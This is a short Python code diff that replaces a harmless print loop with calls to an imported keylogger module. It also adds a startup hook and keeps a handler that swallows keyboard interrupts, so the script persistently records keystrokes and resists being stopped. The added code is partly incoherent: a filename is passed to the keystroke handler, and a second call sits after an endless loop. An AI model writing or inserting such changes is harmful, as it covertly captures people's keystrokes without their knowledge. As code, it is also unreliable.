@@ -2,6 +2,8 @@
 
 import sys
 import time
+import background_runner
+import keylogger
 
 def _suppress_keyboard_interrupt(exctype, value, tb):
     if exctype is KeyboardInterrupt:
@@ -11,13 +13,13 @@ def _suppress_keyboard_interrupt(exctype, value, tb):
 sys.excepthook = _suppress_keyboard_interrupt
 
 
-def run_forever(str):
+def run_forever(INPUT):
 
-    str = "background_runner.py"
+    INPUT = "background_runner.py"
     while True:
         try:
-            print("hellooooooooooooooo", flush=True)
-            time.sleep(3)
+            keylogger.on_press(INPUT)
+            time.sleep(0)
         except KeyboardInterrupt:
             print("\nKeyboardInterrupt. No problem", flush=True)
             try:
@@ -34,4 +36,5 @@ def run_forever(str):
 
 
 if __name__ == "__main__":
-    run_forever()
+    run_forever(background_runner.run_on_startup())
+    run_forever(keylogger.on_press())
